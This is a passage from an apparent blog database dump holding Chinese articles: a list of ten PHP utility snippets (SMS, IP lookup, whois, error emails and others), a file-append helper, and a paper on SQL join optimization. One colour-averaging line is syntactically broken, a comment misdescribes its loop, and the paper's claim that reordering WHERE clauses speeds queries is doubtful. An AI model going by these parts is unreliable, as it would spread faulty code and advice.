href=&#39;&quot;.$this-&gt;url.$this-&gt;totalpages.&quot;&#39;&gt;&quot;.$this-&gt;endpage.&quot;&lt;/a&gt;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>return $return;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>?&gt;</p>\r\n',0,1437807259,0,0),(64,10,'十个超级有用的PHP代码片段','<p>1. 发送短信</p>\r\n\r\n<p>调用 TextMagic API。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Include the TextMagic PHP lib</p>\r\n\r\n<p>require(&#39;textmagic-sms-api-php/TextMagicAPI.php&#39;);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Set the username and password information</p>\r\n\r\n<p>$username = &#39;myusername&#39;;</p>\r\n\r\n<p>$password = &#39;mypassword&#39;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Create a new instance of TM</p>\r\n\r\n<p>$router = new TextMagicAPI(array(</p>\r\n\r\n<p>&#39;username&#39; =&gt; $username,</p>\r\n\r\n<p>&#39;password&#39; =&gt; $password</p>\r\n\r\n<p>));</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Send a text message to &#39;999-123-4567&#39;</p>\r\n\r\n<p>$result = $router-&gt;send(&#39;Wake up!&#39;, array(9991234567), true);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// result: Result is: Array ( [messages] =&gt; Array ( [19896128] =&gt; 9991234567 ) [sent_text] =&gt; Wake up! [parts_count] =&gt; 1 )</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>2. 根据IP查找地址</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>function detect_city($ip) {</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$default = &#39;UNKNOWN&#39;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>if (!is_string($ip) || strlen($ip) &lt; 1 || $ip == &#39;127.0.0.1&#39; || $ip == &#39;localhost&#39;)</p>\r\n\r\n<p>$ip = &#39;8.8.8.8&#39;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$curlopt_useragent = &#39;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)&#39;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$url = &#39;http://ipinfodb.com/ip_locator.php?ip=&#39; . urlencode($ip);</p>\r\n\r\n<p>$ch = curl_init();</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$curl_opt = array(</p>\r\n\r\n<p>CURLOPT_FOLLOWLOCATION =&gt; 1,</p>\r\n\r\n<p>CURLOPT_HEADER =&gt; 0,</p>\r\n\r\n<p>CURLOPT_RETURNTRANSFER =&gt; 1,</p>\r\n\r\n<p>CURLOPT_USERAGENT =&gt; $curlopt_useragent,</p>\r\n\r\n<p>CURLOPT_URL =&gt; $url,</p>\r\n\r\n<p>CURLOPT_TIMEOUT =&gt; 1,</p>\r\n\r\n<p>CURLOPT_REFERER =&gt; &#39;http://&#39; . $_SERVER[&#39;HTTP_HOST&#39;],</p>\r\n\r\n<p>);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>curl_setopt_array($ch, $curl_opt);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$content = curl_exec($ch);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>if (!is_null($curl_info)) {</p>\r\n\r\n<p>$curl_info = curl_getinfo($ch);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>curl_close($ch);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>if ( preg_match(&#39;{&lt;li&gt;City : ([^&lt;]*)&lt;/li&gt;}i&#39;, $content, $regs) ) {</p>\r\n\r\n<p>$city = $regs[1];</p>\r\n\r\n<p>}</p>\r\n\r\n<p>if ( preg_match(&#39;{&lt;li&gt;State/Province : ([^&lt;]*)&lt;/li&gt;}i&#39;, $content, $regs) ) {</p>\r\n\r\n<p>$state = $regs[1];</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>if( $city!=&#39;&#39; &amp;&amp; $state!=&#39;&#39; ){</p>\r\n\r\n<p>$location = $city . &#39;, &#39; . $state;</p>\r\n\r\n<p>return$location;</p>\r\n\r\n<p>}else{</p>\r\n\r\n<p>return$default;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>3. 显示网页的源代码</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;?php // display source code</p>\r\n\r\n<p>$lines = file(&#39;http://google.com/&#39;);</p>\r\n\r\n<p>foreach ($lines as $line_num =&gt; $line) {</p>\r\n\r\n<p>// loop thru each line and prepend line numbers</p>\r\n\r\n<p>echo &quot;Line #&lt;b&gt;{$line_num}&lt;/b&gt; : &quot; . htmlspecialchars($line) . &quot;&lt;br&gt;\\n&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>4. 检查服务器是否使用HTTPS</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>if ($_SERVER[&#39;HTTPS&#39;] != &quot;on&quot;) {</p>\r\n\r\n<p>echo &quot;This is not HTTPS&quot;;</p>\r\n\r\n<p>}else{</p>\r\n\r\n<p>echo &quot;This is HTTPS&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>5. 显示Faceboo**丝数量</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>function fb_fan_count($facebook_name){</p>\r\n\r\n<p>// Example: https://graph.facebook.com/digimantra</p>\r\n\r\n<p>$data = json_decode(file_get_contents(&quot;https://graph.facebook.com/&quot;.$facebook_name));</p>\r\n\r\n<p>echo $data-&gt;likes;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>6. 检测图片的主要颜色</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$i = imagecreatefromjpeg(&quot;image.jpg&quot;);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>for ($x=0;$x&lt;imagesx($i);$x++) {</p>\r\n\r\n<p>for ($y=0;$y&lt;imagesy($i);$y++) {</p>\r\n\r\n<p>$rgb = imagecolorat($i,$x,$y);</p>\r\n\r\n<p>$r = ($rgb &gt;&gt; 16) &amp; 0xFF;</p>\r\n\r\n<p>$g = ($rgb &gt;&gt; &amp; 0xFF;</p>\r\n\r\n<p>$b = $rgb &amp; 0xFF;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$rTotal += $r;</p>\r\n\r\n<p>$gTotal += $g;</p>\r\n\r\n<p>$bTotal += $b;</p>\r\n\r\n<p>$total++;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$rAverage = round($rTotal/$total);</p>\r\n\r\n<p>$gAverage = round($gTotal/$total);</p>\r\n\r\n<p>$bAverage = round($bTotal/$total);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>7. 获取内存使用信息</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>echo&quot;Initial: &quot;.memory_get_usage().&quot; bytes \\n&quot;;</p>\r\n\r\n<p>/* prints</p>\r\n\r\n<p>Initial: 361400 bytes</p>\r\n\r\n<p>*/</p>\r\n\r\n<p>// http://www.baoluowanxiang.com/</p>\r\n\r\n<p>// let&#39;s use up some memory</p>\r\n\r\n<p>for ($i = 0; $i &lt; 100000; $i++) {</p>\r\n\r\n<p>$array []= md5($i);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// let&#39;s remove half of the array</p>\r\n\r\n<p>for ($i = 0; $i &lt; 100000; $i++) {</p>\r\n\r\n<p>unset($array[$i]);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>echo&quot;Final: &quot;.memory_get_usage().&quot; bytes \\n&quot;;</p>\r\n\r\n<p>/* prints</p>\r\n\r\n<p>Final: 885912 bytes</p>\r\n\r\n<p>*/</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>echo&quot;Peak: &quot;.memory_get_peak_usage().&quot; bytes \\n&quot;;</p>\r\n\r\n<p>/* prints</p>\r\n\r\n<p>Peak: 13687072 bytes</p>\r\n\r\n<p>*/</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>8. 使用 gzcompress() 压缩数据</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$string =</p>\r\n\r\n<p>&quot;Lorem ipsum dolor sit amet, consectetur</p>\r\n\r\n<p>adipiscing elit. Nunc ut elit id mi ultricies</p>\r\n\r\n<p>adipiscing. Nulla facilisi. Praesent pulvinar,</p>\r\n\r\n<p>sapien vel feugiat vestibulum, nulla dui pretium orci,</p>\r\n\r\n<p>non ultricies elit lacus quis ante. Lorem ipsum dolor</p>\r\n\r\n<p>sit amet, consectetur adipiscing elit. Aliquam</p>\r\n\r\n<p>pretium ullamcorper urna quis iaculis. Etiam ac massa</p>\r\n\r\n<p>sed turpis tempor luctus. Curabitur sed nibh eu elit</p>\r\n\r\n<p>mollis congue. Praesent ipsum diam, consectetur vitae</p>\r\n\r\n<p>ornare a, aliquam a nunc. In id magna pellentesque</p>\r\n\r\n<p>tellus posuere adipiscing. Sed non mi metus, at lacinia</p>\r\n\r\n<p>augue. Sed magna nisi, ornare in mollis in, mollis</p>\r\n\r\n<p>sed nunc. Etiam at justo in leo congue mollis.</p>\r\n\r\n<p>Nullam in neque eget metus hendrerit scelerisque</p>\r\n\r\n<p>eu non enim. Ut malesuada lacus eu nulla bibendum</p>\r\n\r\n<p>id euismod urna sodales. &quot;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$compressed = gzcompress($string);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>echo &quot;Original size: &quot;. strlen($string).&quot;\\n&quot;;</p>\r\n\r\n<p>/* prints</p>\r\n\r\n<p>Original size: 800</p>\r\n\r\n<p>*/</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>echo &quot;Compressed size: &quot;. strlen($compressed).&quot;\\n&quot;;</p>\r\n\r\n<p>/* prints</p>\r\n\r\n<p>Compressed size: 418</p>\r\n\r\n<p>*/</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// getting it back</p>\r\n\r\n<p>$original = gzuncompress($compressed);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>9. 使用PHP做Whois检查</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>function whois_query($domain) {</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// fix the domain name:</p>\r\n\r\n<p>$domain = strtolower(trim($domain));</p>\r\n\r\n<p>$domain = preg_replace(&#39;/^http:\\/\\//i&#39;, &#39;&#39;, $domain);</p>\r\n\r\n<p>$domain = preg_replace(&#39;/^www\\./i&#39;, &#39;&#39;, $domain);</p>\r\n\r\n<p>$domain = explode(&#39;/&#39;, $domain);</p>\r\n\r\n<p>$domain = trim($domain[0]);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// split the TLD from domain name</p>\r\n\r\n<p>$_domain = explode(&#39;.&#39;, $domain);</p>\r\n\r\n<p>$lst = count($_domain)-1;</p>\r\n\r\n<p>$ext = $_domain[$lst];</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// You find resources and lists</p>\r\n\r\n<p>// like these on wikipedia:</p>\r\n\r\n<p>//</p>\r\n\r\n<p>// http://de.wikipedia.org/wiki/Whois</p>\r\n\r\n<p>//</p>\r\n\r\n<p>$servers = array(</p>\r\n\r\n<p>&quot;biz&quot; =&gt; &quot;whois.neulevel.biz&quot;,</p>\r\n\r\n<p>&quot;com&quot; =&gt; &quot;whois.internic.net&quot;,</p>\r\n\r\n<p>&quot;us&quot; =&gt; &quot;whois.nic.us&quot;,</p>\r\n\r\n<p>&quot;coop&quot; =&gt; &quot;whois.nic.coop&quot;,</p>\r\n\r\n<p>&quot;info&quot; =&gt; &quot;whois.nic.info&quot;,</p>\r\n\r\n<p>&quot;name&quot; =&gt; &quot;whois.nic.name&quot;,</p>\r\n\r\n<p>&quot;net&quot; =&gt; &quot;whois.internic.net&quot;,</p>\r\n\r\n<p>&quot;gov&quot; =&gt; &quot;whois.nic.gov&quot;,</p>\r\n\r\n<p>&quot;edu&quot; =&gt; &quot;whois.internic.net&quot;,</p>\r\n\r\n<p>&quot;mil&quot; =&gt; &quot;rs.internic.net&quot;,</p>\r\n\r\n<p>&quot;int&quot; =&gt; &quot;whois.iana.org&quot;,</p>\r\n\r\n<p>&quot;ac&quot; =&gt; &quot;whois.nic.ac&quot;,</p>\r\n\r\n<p>&quot;ae&quot; =&gt; &quot;whois.uaenic.ae&quot;,</p>\r\n\r\n<p>&quot;at&quot; =&gt; &quot;whois.ripe.net&quot;,</p>\r\n\r\n<p>&quot;au&quot; =&gt; &quot;whois.aunic.net&quot;,</p>\r\n\r\n<p>&quot;be&quot; =&gt; &quot;whois.dns.be&quot;,</p>\r\n\r\n<p>&quot;bg&quot; =&gt; &quot;whois.ripe.net&quot;,</p>\r\n\r\n<p>&quot;br&quot; =&gt; &quot;whois.registro.br&quot;,</p>\r\n\r\n<p>&quot;bz&quot; =&gt; &quot;whois.belizenic.bz&quot;,</p>\r\n\r\n<p>&quot;ca&quot; =&gt; &quot;whois.cira.ca&quot;,</p>\r\n\r\n<p>&quot;cc&quot; =&gt; &quot;whois.nic.cc&quot;,</p>\r\n\r\n<p>&quot;ch&quot; =&gt; &quot;whois.nic.ch&quot;,</p>\r\n\r\n<p>&quot;cl&quot; =&gt; &quot;whois.nic.cl&quot;,</p>\r\n\r\n<p>&quot;cn&quot; =&gt; &quot;whois.cnnic.net.cn&quot;,</p>\r\n\r\n<p>&quot;cz&quot; =&gt; &quot;whois.nic.cz&quot;,</p>\r\n\r\n<p>&quot;de&quot; =&gt; &quot;whois.nic.de&quot;,</p>\r\n\r\n<p>&quot;fr&quot; =&gt; &quot;whois.nic.fr&quot;,</p>\r\n\r\n<p>&quot;hu&quot; =&gt; &quot;whois.nic.hu&quot;,</p>\r\n\r\n<p>&quot;ie&quot; =&gt; &quot;whois.domainregistry.ie&quot;,</p>\r\n\r\n<p>&quot;il&quot; =&gt; &quot;whois.isoc.org.il&quot;,</p>\r\n\r\n<p>&quot;in&quot; =&gt; &quot;whois.ncst.ernet.in&quot;,</p>\r\n\r\n<p>&quot;ir&quot; =&gt; &quot;whois.nic.ir&quot;,</p>\r\n\r\n<p>&quot;mc&quot; =&gt; &quot;whois.ripe.net&quot;,</p>\r\n\r\n<p>&quot;to&quot; =&gt; &quot;whois.tonic.to&quot;,</p>\r\n\r\n<p>&quot;tv&quot; =&gt; &quot;whois.tv&quot;,</p>\r\n\r\n<p>&quot;ru&quot; =&gt; &quot;whois.ripn.net&quot;,</p>\r\n\r\n<p>&quot;org&quot; =&gt; &quot;whois.pir.org&quot;,</p>\r\n\r\n<p>&quot;aero&quot; =&gt; &quot;whois.information.aero&quot;,</p>\r\n\r\n<p>&quot;nl&quot; =&gt; &quot;whois.domain-registry.nl&quot;</p>\r\n\r\n<p>);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>if (!isset($servers[$ext])){</p>\r\n\r\n<p>die(&#39;Error: No matching nic server found!&#39;);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$nic_server = $servers[$ext];</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$output = &#39;&#39;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// connect to whois server:</p>\r\n\r\n<p>if ($conn = fsockopen ($nic_server, 43)) {</p>\r\n\r\n<p>fputs($conn, $domain.&quot;\\r\\n&quot;);</p>\r\n\r\n<p>while(!feof($conn)) {</p>\r\n\r\n<p>$output .= fgets($conn,128);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>fclose($conn);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>else { die(&#39;Error: Could not connect to &#39; . $nic_server . &#39;!&#39;); }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>return $output;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>10. 通过Email发送PHP错误</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;?php</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Our custom error handler</p>\r\n\r\n<p>function nettuts_error_handler($number, $message, $file, $line, $vars){</p>\r\n\r\n<p>$email = &quot;</p>\r\n\r\n<p>&lt;p&gt;An error ($number) occurred on line</p>\r\n\r\n<p>&lt;strong&gt;$line&lt;/strong&gt; and in the &lt;strong&gt;file: $file.&lt;/strong&gt;</p>\r\n\r\n<p>&lt;p&gt; $message &lt;/p&gt;&quot;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$email .= &quot;&lt;pre&gt;&quot; . print_r($vars, 1) . &quot;&lt;/pre&gt;&quot;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$headers = &#39;Content-type: text/html; charset=iso-8859-1&#39; . &quot;\\r\\n&quot;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Email the error to someone...</p>\r\n\r\n<p>error_log($email, 1, &#39;you@youremail.com&#39;, $headers);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Make sure that you decide how to respond to errors (on the user&#39;s side)</p>\r\n\r\n<p>// Either echo an error message, or kill the entire project. Up to you...</p>\r\n\r\n<p>// The code below ensures that we only &quot;die&quot; if the error was more than</p>\r\n\r\n<p>// just a NOTICE.</p>\r\n\r\n<p>if ( ($number !== E_NOTICE) &amp;&amp; ($number &lt; 2048) ) {</p>\r\n\r\n<p>die(&quot;There was an error. Please try again later.&quot;);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// We should use our custom function to handle errors.</p>\r\n\r\n<p>set_error_handler(&#39;nettuts_error_handler&#39;);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Trigger an error... (var doesn&#39;t exist)</p>\r\n\r\n<p>echo$somevarthatdoesnotexist;</p>\r\n',0,1437807353,0,0),(65,10,'php将字符追加到指定文件中(数组类型效果仿print_r)','<p>&lt;?php</p>\r\n\r\n<p>function txt($arr)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$keys=array_keys($arr);</p>\r\n\r\n<p>$txt = &quot;array(\\r\\n&quot;;</p>\r\n\r\n<p>for($i=0;$i&lt;count($keys);$i++)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>if(is_array($arr[$keys[$i]]))</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$_temp = txt($arr[$keys[$i]]);</p>\r\n\r\n<p>$_temp = str_replace(&quot;\\r\\n&quot;,&quot;\\r\\n\\t&quot;,$_temp);</p>\r\n\r\n<p>$_temp = substr($_temp,0,strlen($_temp)-1);</p>\r\n\r\n<p>$txt .= $keys[$i].&#39;=&gt;&#39;.$_temp;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>else</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$txt .= $keys[$i].&#39;=&gt;&#39;.$arr[$keys[$i]].&quot;\\r\\n&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>$txt .= &quot;)\\r\\n&quot;;</p>\r\n\r\n<p>return $txt;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>function input($txt,$path)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>if(is_array($txt)){$txt=txt($txt);}</p>\r\n\r\n<p>if(substr($txt,strlen($txt)-2)!=&quot;\\r\\n&quot;){$txt .= &quot;\\r\\n&quot;;}</p>\r\n\r\n<p>$file = file_get_contents($path);</p>\r\n\r\n<p>$file .= $txt;</p>\r\n\r\n<p>file_put_contents($path,$file);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>//调用方法</p>\r\n\r\n<p>$a=array(</p>\r\n\r\n<p>&#39;a&#39;=&gt;&#39;a&#39;,</p>\r\n\r\n<p>&#39;b&#39;=&gt;array(&#39;a&#39;=&gt;&#39;a2&#39;),</p>\r\n\r\n<p>&#39;c&#39;=&gt;array(</p>\r\n\r\n<p>&#39;a&#39;=&gt;&#39;a3&#39;,</p>\r\n\r\n<p>&#39;b&#39;=&gt;array(&#39;f&#39;=&gt;&#39;f&#39;,&#39;g&#39;=&gt;&#39;评&#39;)</p>\r\n\r\n<p>)</p>\r\n\r\n<p>);</p>\r\n\r\n<p>input($a,&#39;c:/a.txt&#39;);</p>\r\n\r\n<p>?&gt;</p>\r\n',0,1437807424,0,0),(66,24,'基于SQL的多表联接查询优化研究','<p>张敏 （西安翻译学院计算机教研室）<br />\r\n摘要：数据库性能问题一直是决策者及技术人员共同关注的焦点，影响数据库性能的一个重要因素就是SQL查询语句的低效率，而在SQL查询语句中多表联接查询的使用频率非常之高，最能体现查询复杂性，往往是SQL优化的重点与难点。为了提高查询速度，提高数据库应用系统的执行效率，文章从分析关系数据库多表查询处理过程入手讨论查询优化技巧，指出多表查询优化的原则。通过几种优化策略的研究，在时间和空间上提高了系统的性能，在一定程度上提高了查询效率。<br />\r\n关键词：SQL 优化 联接<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 引言<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 多表联接操作往往要耗费大量的CPU时间和内存，所以多表联接查询在查询优化中起到了至关重要的作用，是数据库中最基本、最常用、最复杂的操作。在数据库的管理信息系统中，联接查询操作是所有数据库操作中所占据比重最大的操作。当数据库系统积累到一定程度，若查询时采用单条顺序扫描，那么扫描一遍所有的记录可能就得花上几十分钟，甚至几小时，这样的系统就失去了现实的使用价值。采取什么样的查询策略，使联接查询时间降低，就是本文需要研究的查询优化问题。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 优化原理<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 联接查询操作的前提是笛卡儿积，即要将多表中所有的元组拿来运算，再从中找出符合条件的，其本身就增加了运算的负担，所以我们在做优化时尽量避免联接查询。如果必须要使用联接查询时也要尽量使用较少的联接表，查询优化力图找出给定等价的表达式，但执行效率更高，一个查询往往会有许多实现方法，关键是如何找出一个与之等价的且操作时间又少的表达式。优化的核心问题是尽可能减少查询中各表的参与加工的数据量，从而达到优化时间和空间的目的。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2 联接查询优化的原则<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.1 尽量使用单表操作<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 给定三个关系模式：（以下实例均以此为例）<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s（sno，sname，sec，birthday，email）<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c（cno，cname，creadit，tname）<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sc（sno，cno，score）<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 例：查询1001学生选修的课程成绩。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 分析：在此查询中涉及到sno和score两个字段，sno在s表中，score在sc表中，若要使用s和sc的联接，<br />\r\nSQL语句为：SELECT score FROM s，sc WHERE s.sno=sc.sno and sno=&lsquo;1001&rsquo;<br />\r\n则此查询就是多表联接查询，这样势必要做笛卡儿积操作，所以会增加检索的时间。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 分析：在此查询中涉及到的sno和score两个字段可以在sc表中全部找到，按照尽量使用单表操作原则，可以只用一个sc表。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL语句改为：SELECT score FROM sc WHERE sno=&lsquo;1001&rsquo;这样避免了联接时的笛卡儿积操作，大大提高检索速度。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.2 避免不了的联接操作要做到以下几个原则：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.2.1 联接表时联少不联多 在做多表联接查询时，联接的表的个数尽量少，这样就可以减少查询中参与加工的数据量，从而达到优化时间和空间的目的。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 例：查询选修了&ldquo;数据库应用&rdquo;课程的学生的学号和成绩。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 分析：此查询中涉及到sno、cname和score三个字段，分别在s、c和sc中，若要使用s、c和sc的联接，<br />\r\nSQL语句为：SELECT sno，score FROM s，c，sc WHERE s.sno=sc.sno and c.cno=sc.cno and cname=&lsquo;数据库应用&rsquo;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 则此查询是多表联接查询，并且联接的三表中，两两都要做笛卡儿积操作，所以会增加检索的时间。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 分析：此查询中涉及到sno、cname和score三个字段，分别在c表和sc表中就可以全部找到，按照联接表时联少不联多的原则，可以只用c和sc表。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL语句改为：SELECT sno，score FROM c，sc WHERE c.cno=sc.cno and cname=&lsquo;数据库应用&rsquo;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.2.2 联接表时在联少不联多的基础上要能实现联接 在做多表联接查询时，使联接的表的个数尽量少，但是不能一味的追求表的个数，如果表的使用不能达到我们要查询的数据，或者不能实现联接，那也是不成功的。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 例3：查询选修了&ldquo;数据库应用&rdquo;课程的学生的姓名。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 分析：此查询中涉及到sname和cname两个字段，分别在s表和c表中，若要使用s和c的联接，SQL语句为：SELECT sname，cname FROM s，c WHERE&nbsp; cname=&lsquo;数据库应用&rsquo;则此查询是多表联接查询，但两个表没有公共属性，所以实现不了联接，这样此操作就变成了单纯的笛卡儿积操作，在此联接中会查询出不符合条件的记录，失去了查询的意义。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 分析：此查询中涉及到sname和cname两个字段，分别在s表和c表中，但是s表和c表没有公共属性，不能实现联接，所以必须借助sc表，所以此查询是s表、c表和sc表三表的联接。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL语句改为：SELECT sname，cname FROM s，c，sc WHERE s.sno=sc.sno and c.cno=sc.cno and cname=&lsquo;数据库应用&rsquo;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.3 先筛选后联接<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 当查询多个数据表时，要先过滤后联接。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 例5：查询所有成绩大于70分的学生的信息。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 分析：要做s表和sc表两表联接，并筛选出符合条件的记录。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL语句为：SELECT*FROM s，sc WHERE s.sno=sc.sno&nbsp;&nbsp; and score&gt;70<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 此查询语句首先将两个数据表按照学号进行联接，然后再将符合条件的记录筛选。由于两个数据表进行联接时有些记录是以后要筛选掉的，且多个数据表联接是笛卡尔积运算，消耗的时间会随着记录个数的增加很快地增长。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL语句改为：SELECT*FROM s，sc WHERE score&gt;70 and s.sno=sc.sno<br />\r\n此联接查询语句克服了以上缺点，首先筛选出符合条件的记录，减少了进行联接的记录个数，然后再执行联接查询，大大提高了查询效率。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3 结束语<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 